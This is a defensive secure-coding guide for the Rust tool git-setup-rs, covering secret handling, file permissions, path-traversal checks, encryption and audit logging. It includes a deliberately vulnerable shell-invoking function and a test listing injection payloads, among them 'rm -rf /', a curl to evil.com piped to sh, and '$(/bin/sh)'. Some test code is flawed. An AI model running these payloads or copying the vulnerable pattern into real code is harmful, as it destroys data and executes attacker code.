# Security Implementation Examples for git-setup-rs

## Overview

This guide provides comprehensive security implementation examples for the git-setup-rs project. Security is paramount when handling Git configurations, SSH keys, and credentials. These examples show how to implement security correctly from the ground up.

## Security Principles

1. **Defense in Depth**: Multiple layers of security
2. **Least Privilege**: Only grant necessary permissions
3. **Fail Secure**: Errors should result in denied access, not granted access
4. **Zero Trust**: Validate everything, trust nothing
5. **Audit Everything**: Log security-relevant events

## Layer 1: Memory Security

### Secure String Handling

```rust
use zeroize::{Zeroize, ZeroizeOnDrop};
use std::fmt;

/// A string that automatically zeros its memory when dropped
#[derive(ZeroizeOnDrop)]
pub struct SensitiveString {
    #[zeroize(drop)]
    inner: String,
}

impl SensitiveString {
    pub fn new(s: String) -> Self {
        Self { inner: s }
    }
    
    /// Expose the inner value for use
    /// WARNING: Be careful not to leak this!
    pub fn expose_secret(&self) -> &str {
        &self.inner
    }
    
    /// Perform an operation with the secret without exposing it
    pub fn use_secret<F, R>(&self, f: F) -> R
    where
        F: FnOnce(&str) -> R,
    {
        f(&self.inner)
    }
}

// Prevent accidental logging of secrets
impl fmt::Debug for SensitiveString {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "SensitiveString(***)")
    }
}

impl fmt::Display for SensitiveString {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "***")
    }
}

// Example usage in ProfileManager
pub struct ProfileManager {
    encryption_key: SensitiveString,
}

impl ProfileManager {
    pub fn new(key: String) -> Self {
        Self {
            encryption_key: SensitiveString::new(key),
        }
    }
    
    pub fn encrypt_profile(&self, profile: &Profile) -> Result<Vec<u8>, Error> {
        self.encryption_key.use_secret(|key| {
            // Use key for encryption without exposing it
            encrypt_with_key(profile, key)
        })
    }
}
```

### Secure Buffer for Binary Data

```rust
use zeroize::Zeroize;
use std::ops::{Deref, DerefMut};

/// A buffer that zeros its contents on drop
pub struct SecureBuffer {
    data: Vec<u8>,
}

impl SecureBuffer {
    pub fn new(size: usize) -> Self {
        Self {
            data: vec![0u8; size],
        }
    }
    
    pub fn from_vec(mut vec: Vec<u8>) -> Self {
        // Zero the original vector's capacity
        let result = Self { data: vec.clone() };
        vec.zeroize();
        result
    }
}

impl Drop for SecureBuffer {
    fn drop(&mut self) {
        self.data.zeroize();
    }
}

impl Deref for SecureBuffer {
    type Target = [u8];
    
    fn deref(&self) -> &Self::Target {
        &self.data
    }
}

impl DerefMut for SecureBuffer {
    fn deref_mut(&mut self) -> &mut Self::Target {
        &mut self.data
    }
}

// Memory locking for ultra-sensitive data
#[cfg(unix)]
pub fn lock_memory(buffer: &[u8]) -> Result<(), Error> {
    use libc::{mlock, size_t};
    use std::os::raw::c_void;
    
    let result = unsafe {
        mlock(
            buffer.as_ptr() as *const c_void,
            buffer.len() as size_t,
        )
    };
    
    if result == 0 {
        Ok(())
    } else {
        Err(Error::MemoryLockFailed)
    }
}
```

## Layer 2: File System Security

### Atomic File Operations with Permissions

```rust
use std::fs::{self, File, OpenOptions};
use std::io::{self, Write};
use std::path::Path;
use tempfile::NamedTempFile;

#[cfg(unix)]
use std::os::unix::fs::PermissionsExt;

pub struct SecureFileWriter;

impl SecureFileWriter {
    /// Write a file atomically with secure permissions
    pub fn write_sensitive_file(
        path: &Path,
        content: &[u8],
        mode: u32,
    ) -> io::Result<()> {
        // Create parent directory if needed
        if let Some(parent) = path.parent() {
            fs::create_dir_all(parent)?;
            Self::secure_directory_permissions(parent)?;
        }
        
        // Write to temp file in same directory (for atomic rename)
        let dir = path.parent().unwrap_or_else(|| Path::new("."));
        let mut temp_file = NamedTempFile::new_in(dir)?;
        
        // Set permissions before writing content
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let permissions = fs::Permissions::from_mode(mode);
            temp_file.as_file().set_permissions(permissions)?;
        }
        
        // Write content
        temp_file.write_all(content)?;
        temp_file.as_file().sync_all()?;
        
        // Atomic rename
        temp_file.persist(path)?;
        
        Ok(())
    }
    
    #[cfg(unix)]
    fn secure_directory_permissions(dir: &Path) -> io::Result<()> {
        let metadata = fs::metadata(dir)?;
        let mut permissions = metadata.permissions();
        
        // Remove group/other permissions
        permissions.set_mode(0o700);
        fs::set_permissions(dir, permissions)?;
        
        Ok(())
    }
    
    #[cfg(not(unix))]
    fn secure_directory_permissions(_dir: &Path) -> io::Result<()> {
        // Windows: Rely on ACLs inherited from user profile
        Ok(())
    }
}

// Usage example for SSH keys
pub fn save_ssh_key(key_path: &Path, private_key: &[u8]) -> Result<(), Error> {
    // SSH keys must be readable only by owner (0o600)
    SecureFileWriter::write_sensitive_file(key_path, private_key, 0o600)
        .map_err(|e| Error::FileWrite(e))
}

// Usage example for config files  
pub fn save_config(config_path: &Path, config: &Config) -> Result<(), Error> {
    let content = toml::to_string(config)?;
    
    // Config files can be slightly less restrictive (0o640)
    SecureFileWriter::write_sensitive_file(
        config_path,
        content.as_bytes(),
        0o640,
    ).map_err(|e| Error::FileWrite(e))
}
```

### Directory Traversal Protection

```rust
use std::path::{Path, PathBuf, Component};

/// Safely join paths, preventing directory traversal attacks
pub fn safe_join(base: &Path, untrusted: &str) -> Result<PathBuf, Error> {
    let mut path = base.to_path_buf();
    
    for component in Path::new(untrusted).components() {
        match component {
            Component::Normal(name) => {
                // Only allow normal path components
                path.push(name);
            }
            Component::CurDir => {
                // Current directory is OK
            }
            _ => {
                // Reject ParentDir (..), RootDir (/), Prefix (C:\)
                return Err(Error::InvalidPath(
                    "Path contains invalid components".to_string()
                ));
            }
        }
    }
    
    // Verify the final path is still under base
    let canonical_base = base.canonicalize()
        .map_err(|_| Error::InvalidPath("Cannot canonicalize base".to_string()))?;
    let canonical_path = path.canonicalize()
        .map_err(|_| Error::InvalidPath("Cannot canonicalize path".to_string()))?;
    
    if !canonical_path.starts_with(&canonical_base) {
        return Err(Error::InvalidPath(
            "Path escapes base directory".to_string()
        ));
    }
    
    Ok(path)
}

// Usage in ProfileManager
impl ProfileManager {
    pub fn load_profile(&self, name: &str) -> Result<Profile, Error> {
        // Validate profile name first
        if !is_valid_profile_name(name) {
            return Err(Error::InvalidProfileName(name.to_string()));
        }
        
        // Safely construct path
        let profile_path = safe_join(&self.profiles_dir, &format!("{}.toml", name))?;
        
        // Load with additional validation
        let content = fs::read_to_string(&profile_path)?;
        let profile: Profile = toml::from_str(&content)?;
        
        // Validate loaded data
        profile.validate()?;
        
        Ok(profile)
    }
}

fn is_valid_profile_name(name: &str) -> bool {
    // Only allow alphanumeric and limited special characters
    name.chars().all(|c| {
        c.is_alphanumeric() || c == '-' || c == '_'
    }) && !name.is_empty() && name.len() <= 50
}
```

## Layer 3: Input Validation and Sanitization

### Command Injection Prevention

```rust
use std::process::{Command, Stdio};
use std::ffi::OsStr;

/// Safely execute external commands
pub struct SafeCommand;

impl SafeCommand {
    /// Execute git with validated arguments
    pub fn git<I, S>(args: I) -> Result<String, Error>
    where
        I: IntoIterator<Item = S>,
        S: AsRef<OsStr>,
    {
        let output = Command::new("git")
            .args(args)
            .stdin(Stdio::null()) // Never accept stdin
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .output()
            .map_err(|e| Error::CommandFailed(format!("git: {}", e)))?;
        
        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            return Err(Error::CommandFailed(format!("git failed: {}", stderr)));
        }
        
        Ok(String::from_utf8_lossy(&output.stdout).into_owned())
    }
    
    /// NEVER do this - example of what to avoid
    pub fn unsafe_git_command(user_input: &str) -> Result<String, Error> {
        // DON'T DO THIS - Command injection vulnerability!
        let command = format!("git {}", user_input);
        let output = Command::new("sh")
            .arg("-c")
            .arg(&command)
            .output()?;
        // This allows: "; rm -rf /" in user_input!
        
        Ok(String::from_utf8_lossy(&output.stdout).into_owned())
    }
}

// Safe usage example
pub fn set_git_config(key: &str, value: &str) -> Result<(), Error> {
    // Validate key format
    if !is_valid_git_key(key) {
        return Err(Error::InvalidGitKey(key.to_string()));
    }
    
    // Use array of arguments, not string concatenation
    SafeCommand::git(&["config", "--local", key, value])?;
    Ok(())
}

fn is_valid_git_key(key: &str) -> bool {
    // Git config keys are section.name or section.subsection.name
    let parts: Vec<&str> = key.split('.').collect();
    
    parts.len() >= 2 && 
    parts.len() <= 3 &&
    parts.iter().all(|part| {
        !part.is_empty() &&
        part.chars().all(|c| c.is_alphanumeric() || c == '-')
    })
}
```

### Email and URL Validation

```rust
use regex::Regex;
use url::Url;
use once_cell::sync::Lazy;

static EMAIL_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$").unwrap()
});

static SAFE_URL_SCHEMES: &[&str] = &["https", "ssh", "git"];

pub struct Validator;

impl Validator {
    pub fn validate_email(email: &str) -> Result<(), Error> {
        if email.len() > 254 { // RFC 5321
            return Err(Error::InvalidEmail("Email too long".to_string()));
        }
        
        if !EMAIL_REGEX.is_match(email) {
            return Err(Error::InvalidEmail("Invalid email format".to_string()));
        }
        
        // Additional checks
        if email.contains("..") || email.starts_with('.') || email.ends_with('.') {
            return Err(Error::InvalidEmail("Invalid dot placement".to_string()));
        }
        
        Ok(())
    }
    
    pub fn validate_git_remote_url(url_str: &str) -> Result<(), Error> {
        // Handle SSH-style URLs (git@github.com:user/repo.git)
        if url_str.contains(':') && !url_str.contains("://") {
            return Self::validate_ssh_style_url(url_str);
        }
        
        // Parse standard URLs
        let url = Url::parse(url_str)
            .map_err(|_| Error::InvalidUrl("Cannot parse URL".to_string()))?;
        
        // Check scheme
        if !SAFE_URL_SCHEMES.contains(&url.scheme()) {
            return Err(Error::InvalidUrl(
                format!("Unsafe URL scheme: {}", url.scheme())
            ));
        }
        
        // Validate host
        if let Some(host) = url.host_str() {
            if host.is_empty() || host.contains("..") {
                return Err(Error::InvalidUrl("Invalid host".to_string()));
            }
        } else {
            return Err(Error::InvalidUrl("Missing host".to_string()));
        }
        
        Ok(())
    }
    
    fn validate_ssh_style_url(url: &str) -> Result<(), Error> {
        // Format: user@host:path
        let parts: Vec<&str> = url.splitn(2, ':').collect();
        if parts.len() != 2 {
            return Err(Error::InvalidUrl("Invalid SSH URL format".to_string()));
        }
        
        let user_host = parts[0];
        let path = parts[1];
        
        // Validate user@host
        if !user_host.contains('@') || user_host.contains("..") {
            return Err(Error::InvalidUrl("Invalid SSH URL".to_string()));
        }
        
        // Validate path doesn't escape
        if path.starts_with('/') || path.contains("..") {
            return Err(Error::InvalidUrl("Invalid repository path".to_string()));
        }
        
        Ok(())
    }
}
```

## Layer 4: Cryptographic Security

### Secure Random Generation

```rust
use rand::{Rng, thread_rng};
use rand::distributions::Alphanumeric;

pub struct CryptoUtils;

impl CryptoUtils {
    /// Generate a cryptographically secure random token
    pub fn generate_token(length: usize) -> String {
        thread_rng()
            .sample_iter(&Alphanumeric)
            .take(length)
            .map(char::from)
            .collect()
    }
    
    /// Generate a secure temporary password
    pub fn generate_password() -> SensitiveString {
        const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ\
                                abcdefghijklmnopqrstuvwxyz\
                                0123456789!@#$%^&*";
        
        let mut rng = thread_rng();
        let password: String = (0..20)
            .map(|_| {
                let idx = rng.gen_range(0..CHARSET.len());
                CHARSET[idx] as char
            })
            .collect();
        
        SensitiveString::new(password)
    }
    
    /// Constant-time string comparison
    pub fn secure_compare(a: &[u8], b: &[u8]) -> bool {
        if a.len() != b.len() {
            return false;
        }
        
        let mut result = 0u8;
        for (x, y) in a.iter().zip(b.iter()) {
            result |= x ^ y;
        }
        
        result == 0
    }
}
```

### Encryption for Sensitive Data

```rust
use aes_gcm::{
    aead::{Aead, KeyInit, OsRng},
    Aes256Gcm, Key, Nonce
};
use base64::{Engine as _, engine::general_purpose};

pub struct Encryptor {
    cipher: Aes256Gcm,
}

impl Encryptor {
    /// Create a new encryptor with a random key
    pub fn new() -> (Self, Vec<u8>) {
        let key = Aes256Gcm::generate_key(&mut OsRng);
        let cipher = Aes256Gcm::new(&key);
        
        (Self { cipher }, key.to_vec())
    }
    
    /// Create an encryptor from an existing key
    pub fn from_key(key: &[u8]) -> Result<Self, Error> {
        if key.len() != 32 {
            return Err(Error::InvalidKeyLength);
        }
        
        let key = Key::<Aes256Gcm>::from_slice(key);
        let cipher = Aes256Gcm::new(key);
        
        Ok(Self { cipher })
    }
    
    /// Encrypt data with authenticated encryption
    pub fn encrypt(&self, plaintext: &[u8]) -> Result<String, Error> {
        // Generate random nonce
        let mut nonce_bytes = [0u8; 12];
        OsRng.fill(&mut nonce_bytes);
        let nonce = Nonce::from_slice(&nonce_bytes);
        
        // Encrypt
        let ciphertext = self.cipher
            .encrypt(nonce, plaintext)
            .map_err(|_| Error::EncryptionFailed)?;
        
        // Combine nonce + ciphertext
        let mut result = Vec::with_capacity(12 + ciphertext.len());
        result.extend_from_slice(&nonce_bytes);
        result.extend_from_slice(&ciphertext);
        
        // Base64 encode for storage
        Ok(general_purpose::STANDARD.encode(&result))
    }
    
    /// Decrypt data
    pub fn decrypt(&self, encrypted: &str) -> Result<SecureBuffer, Error> {
        // Base64 decode
        let data = general_purpose::STANDARD
            .decode(encrypted)
            .map_err(|_| Error::DecryptionFailed)?;
        
        if data.len() < 12 {
            return Err(Error::DecryptionFailed);
        }
        
        // Split nonce and ciphertext
        let (nonce_bytes, ciphertext) = data.split_at(12);
        let nonce = Nonce::from_slice(nonce_bytes);
        
        // Decrypt
        let plaintext = self.cipher
            .decrypt(nonce, ciphertext)
            .map_err(|_| Error::DecryptionFailed)?;
        
        Ok(SecureBuffer::from_vec(plaintext))
    }
}

// Usage example: Encrypting stored credentials
pub struct CredentialStore {
    encryptor: Encryptor,
}

impl CredentialStore {
    pub fn store_credential(&self, name: &str, secret: &str) -> Result<String, Error> {
        let plaintext = format!("{}:{}", name, secret);
        self.encryptor.encrypt(plaintext.as_bytes())
    }
    
    pub fn retrieve_credential(&self, encrypted: &str) -> Result<(String, SensitiveString), Error> {
        let decrypted = self.encryptor.decrypt(encrypted)?;
        let plaintext = String::from_utf8(decrypted.to_vec())
            .map_err(|_| Error::DecryptionFailed)?;
        
        let parts: Vec<&str> = plaintext.splitn(2, ':').collect();
        if parts.len() != 2 {
            return Err(Error::DecryptionFailed);
        }
        
        Ok((
            parts[0].to_string(),
            SensitiveString::new(parts[1].to_string())
        ))
    }
}
```

## Layer 5: Access Control and Authentication

### Profile Access Control

```rust
use std::collections::HashMap;
use chrono::{DateTime, Utc, Duration};

#[derive(Debug, Clone)]
pub struct AccessToken {
    pub id: String,
    pub profile_name: String,
    pub permissions: Vec<Permission>,
    pub expires_at: DateTime<Utc>,
}

#[derive(Debug, Clone, PartialEq)]
pub enum Permission {
    Read,
    Write,
    Delete,
    Admin,
}

pub struct AccessController {
    tokens: HashMap<String, AccessToken>,
    max_token_lifetime: Duration,
}

impl AccessController {
    pub fn new() -> Self {
        Self {
            tokens: HashMap::new(),
            max_token_lifetime: Duration::hours(24),
        }
    }
    
    /// Create a new access token for a profile
    pub fn create_token(
        &mut self,
        profile_name: &str,
        permissions: Vec<Permission>,
    ) -> AccessToken {
        let token = AccessToken {
            id: CryptoUtils::generate_token(32),
            profile_name: profile_name.to_string(),
            permissions,
            expires_at: Utc::now() + self.max_token_lifetime,
        };
        
        self.tokens.insert(token.id.clone(), token.clone());
        token
    }
    
    /// Validate a token and check permissions
    pub fn validate_token(
        &self,
        token_id: &str,
        required_permission: Permission,
    ) -> Result<&AccessToken, Error> {
        let token = self.tokens
            .get(token_id)
            .ok_or(Error::InvalidToken)?;
        
        // Check expiration
        if token.expires_at < Utc::now() {
            return Err(Error::TokenExpired);
        }
        
        // Check permission
        if !token.permissions.contains(&required_permission) &&
           !token.permissions.contains(&Permission::Admin) {
            return Err(Error::InsufficientPermissions);
        }
        
        Ok(token)
    }
    
    /// Revoke a token
    pub fn revoke_token(&mut self, token_id: &str) -> Result<(), Error> {
        self.tokens.remove(token_id)
            .ok_or(Error::InvalidToken)?;
        Ok(())
    }
    
    /// Clean up expired tokens
    pub fn cleanup_expired(&mut self) {
        let now = Utc::now();
        self.tokens.retain(|_, token| token.expires_at > now);
    }
}

// Usage in ProfileManager
impl ProfileManager {
    pub fn load_profile_with_auth(
        &self,
        token_id: &str,
        profile_name: &str,
    ) -> Result<Profile, Error> {
        // Validate token
        let token = self.access_controller
            .validate_token(token_id, Permission::Read)?;
        
        // Check if token is for this profile
        if token.profile_name != profile_name && 
           !token.permissions.contains(&Permission::Admin) {
            return Err(Error::InsufficientPermissions);
        }
        
        // Load profile
        self.load_profile(profile_name)
    }
}
```

## Layer 6: Audit Logging

### Security Event Logging

```rust
use chrono::{DateTime, Utc};
use serde::Serialize;

#[derive(Debug, Serialize)]
pub struct SecurityEvent {
    pub timestamp: DateTime<Utc>,
    pub event_type: SecurityEventType,
    pub user: Option<String>,
    pub profile: Option<String>,
    pub source_ip: Option<String>,
    pub success: bool,
    pub details: HashMap<String, String>,
}

#[derive(Debug, Serialize)]
pub enum SecurityEventType {
    ProfileCreated,
    ProfileModified,
    ProfileDeleted,
    ProfileAccessed,
    AuthenticationAttempt,
    AuthenticationSuccess,
    AuthenticationFailure,
    PermissionDenied,
    ConfigurationChanged,
    KeyRotated,
    SuspiciousActivity,
}

pub struct AuditLogger {
    log_file: PathBuf,
    encryptor: Option<Encryptor>,
}

impl AuditLogger {
    pub fn new(log_file: PathBuf, encrypt: bool) -> Result<Self, Error> {
        let encryptor = if encrypt {
            let (enc, key) = Encryptor::new();
            // Store key securely (outside scope of this example)
            Some(enc)
        } else {
            None
        };
        
        Ok(Self { log_file, encryptor })
    }
    
    pub fn log_event(&self, event: SecurityEvent) -> Result<(), Error> {
        let json = serde_json::to_string(&event)?;
        
        let line = if let Some(enc) = &self.encryptor {
            // Encrypt each log line
            enc.encrypt(json.as_bytes())?
        } else {
            json
        };
        
        // Append to log file
        use std::fs::OpenOptions;
        use std::io::Write;
        
        let mut file = OpenOptions::new()
            .create(true)
            .append(true)
            .mode(0o600)
            .open(&self.log_file)?;
        
        writeln!(file, "{}", line)?;
        file.sync_all()?;
        
        Ok(())
    }
    
    pub fn log_security_event(
        &self,
        event_type: SecurityEventType,
        success: bool,
        details: HashMap<String, String>,
    ) -> Result<(), Error> {
        let event = SecurityEvent {
            timestamp: Utc::now(),
            event_type,
            user: std::env::var("USER").ok(),
            profile: None,
            source_ip: None,
            success,
            details,
        };
        
        self.log_event(event)
    }
}

// Usage example
pub fn audit_profile_access(
    logger: &AuditLogger,
    profile_name: &str,
    success: bool,
) {
    let mut details = HashMap::new();
    details.insert("profile".to_string(), profile_name.to_string());
    details.insert("action".to_string(), "read".to_string());
    
    if let Err(e) = logger.log_security_event(
        SecurityEventType::ProfileAccessed,
        success,
        details,
    ) {
        eprintln!("Failed to log audit event: {}", e);
        // Don't fail the operation due to logging failure
    }
}
```

## Layer 7: Secure Communication

### 1Password Integration Security

```rust
use std::process::{Command, Stdio};
use serde::Deserialize;

pub struct OnePasswordClient {
    timeout: Duration,
    audit_logger: AuditLogger,
}

impl OnePasswordClient {
    /// Securely retrieve a secret from 1Password
    pub async fn get_secret(&self, reference: &str) -> Result<SensitiveString, Error> {
        // Validate reference format
        if !reference.starts_with("op://") {
            return Err(Error::Invalid1PasswordReference);
        }
        
        // Log access attempt
        let mut details = HashMap::new();
        details.insert("reference".to_string(), reference.to_string());
        self.audit_logger.log_security_event(
            SecurityEventType::AuthenticationAttempt,
            true,
            details.clone(),
        )?;
        
        // Execute op command with timeout
        let output = tokio::time::timeout(
            self.timeout,
            tokio::process::Command::new("op")
                .args(&["read", reference])
                .stdin(Stdio::null())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .kill_on_drop(true) // Important!
                .output()
        ).await
        .map_err(|_| Error::CommandTimeout)?
        .map_err(|e| Error::CommandFailed(e.to_string()))?;
        
        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            
            // Don't log the actual error (might contain sensitive info)
            self.audit_logger.log_security_event(
                SecurityEventType::AuthenticationFailure,
                false,
                details,
            )?;
            
            return Err(Error::OnePasswordError(
                "Failed to retrieve secret".to_string()
            ));
        }
        
        // Success
        self.audit_logger.log_security_event(
            SecurityEventType::AuthenticationSuccess,
            true,
            details,
        )?;
        
        // Convert to SensitiveString immediately
        let secret = String::from_utf8(output.stdout)
            .map_err(|_| Error::Invalid1PasswordResponse)?;
        
        Ok(SensitiveString::new(secret.trim().to_string()))
    }
    
    /// Validate 1Password is available and authenticated
    pub async fn validate_connection(&self) -> Result<(), Error> {
        let output = tokio::time::timeout(
            Duration::from_secs(5),
            tokio::process::Command::new("op")
                .args(&["whoami"])
                .output()
        ).await
        .map_err(|_| Error::CommandTimeout)?
        .map_err(|e| Error::CommandFailed(e.to_string()))?;
        
        if !output.status.success() {
            return Err(Error::OnePasswordNotAuthenticated);
        }
        
        Ok(())
    }
}
```

## Complete Security Example: Profile Creation

```rust
use crate::security::*;

pub async fn create_secure_profile(
    name: &str,
    email: &str,
    signing_key_ref: Option<&str>,
) -> Result<Profile, Error> {
    let audit_logger = AuditLogger::new(
        PathBuf::from("/var/log/git-setup/audit.log"),
        true,
    )?;
    
    // Step 1: Validate all inputs
    if !is_valid_profile_name(name) {
        audit_logger.log_security_event(
            SecurityEventType::SuspiciousActivity,
            false,
            [("reason", "invalid_profile_name"), ("name", name)]
                .iter().cloned().collect(),
        )?;
        return Err(Error::InvalidProfileName(name.to_string()));
    }
    
    Validator::validate_email(email)?;
    
    // Step 2: Handle signing key securely
    let signing_key = if let Some(key_ref) = signing_key_ref {
        if key_ref.starts_with("op://") {
            // Retrieve from 1Password
            let op_client = OnePasswordClient::new(
                Duration::from_secs(30),
                audit_logger.clone(),
            );
            
            Some(op_client.get_secret(key_ref).await?)
        } else {
            // Validate file path
            let key_path = safe_join(
                &dirs::home_dir().ok_or(Error::NoHomeDirectory)?,
                key_ref,
            )?;
            
            // Read with secure permissions check
            let metadata = fs::metadata(&key_path)?;
            
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                let mode = metadata.permissions().mode();
                if mode & 0o077 != 0 {
                    return Err(Error::InsecureKeyPermissions(format!("{:o}", mode)));
                }
            }
            
            let key_content = fs::read_to_string(&key_path)?;
            Some(SensitiveString::new(key_content))
        }
    } else {
        None
    };
    
    // Step 3: Create profile with validation
    let profile = Profile {
        name: name.to_string(),
        email: email.to_string(),
        signing_key: signing_key.map(|k| k.expose_secret().to_string()),
        created_at: Utc::now(),
        modified_at: Utc::now(),
    };
    
    profile.validate()?;
    
    // Step 4: Save securely
    let profile_path = safe_join(
        &PathBuf::from("/home/user/.config/git-setup/profiles"),
        &format!("{}.toml", name),
    )?;
    
    let content = toml::to_string(&profile)?;
    SecureFileWriter::write_sensitive_file(
        &profile_path,
        content.as_bytes(),
        0o600,
    )?;
    
    // Step 5: Audit log
    audit_logger.log_security_event(
        SecurityEventType::ProfileCreated,
        true,
        [("profile", name)].iter().cloned().collect(),
    )?;
    
    Ok(profile)
}
```

## Security Checklist

Before deploying, ensure:

- [ ] All sensitive strings use `SensitiveString`
- [ ] Memory is zeroed for all secrets
- [ ] File permissions are restrictive (0o600/0o700)
- [ ] All inputs are validated and sanitized
- [ ] No string concatenation for commands
- [ ] Encryption keys are properly managed
- [ ] Audit logging is enabled
- [ ] Error messages don't leak sensitive info
- [ ] Timeouts are set for all external commands
- [ ] HTTPS is enforced for all network operations
- [ ] Directory traversal is prevented
- [ ] Rate limiting is implemented where needed

## Testing Security

```rust
#[cfg(test)]
mod security_tests {
    use super::*;
    
    #[test]
    fn test_sensitive_string_zeroed() {
        let secret = SensitiveString::new("password123".to_string());
        let ptr = secret.expose_secret().as_ptr();
        let len = secret.expose_secret().len();
        
        drop(secret);
        
        // Verify memory is zeroed (in debug mode)
        #[cfg(debug_assertions)]
        unsafe {
            let slice = std::slice::from_raw_parts(ptr, len);
            assert!(slice.iter().all(|&b| b == 0));
        }
    }
    
    #[test]
    fn test_path_traversal_prevention() {
        let base = Path::new("/home/user/.config");
        
        // These should fail
        assert!(safe_join(base, "../../../etc/passwd").is_err());
        assert!(safe_join(base, "/etc/passwd").is_err());
        assert!(safe_join(base, "profiles/../../../etc/passwd").is_err());
        
        // These should succeed
        assert!(safe_join(base, "profiles/work.toml").is_ok());
        assert!(safe_join(base, "./profiles/work.toml").is_ok());
    }
    
    #[test]
    fn test_command_injection_prevention() {
        // These dangerous inputs should be safely handled
        let dangerous_inputs = vec![
            "; rm -rf /",
            "|| curl evil.com/steal.sh | sh",
            "` cat /etc/passwd`",
            "$(/bin/sh)",
        ];
        
        for input in dangerous_inputs {
            let result = set_git_config("user.name", input);
            // Should either safely handle or reject, never execute
            assert!(result.is_err() || !input.contains("rm"));
        }
    }
}
```

## Conclusion

Security in git-setup-rs is implemented through multiple layers:

1. **Memory Security**: Zeroization and secure buffers
2. **File System Security**: Atomic operations and permissions
3. **Input Validation**: Sanitization and injection prevention
4. **Cryptographic Security**: Proper encryption and randomness
5. **Access Control**: Token-based permissions
6. **Audit Logging**: Comprehensive security event tracking
7. **Secure Communication**: Protected external integrations

Remember: Security is not a feature, it's a requirement. Every line of code should consider security implications.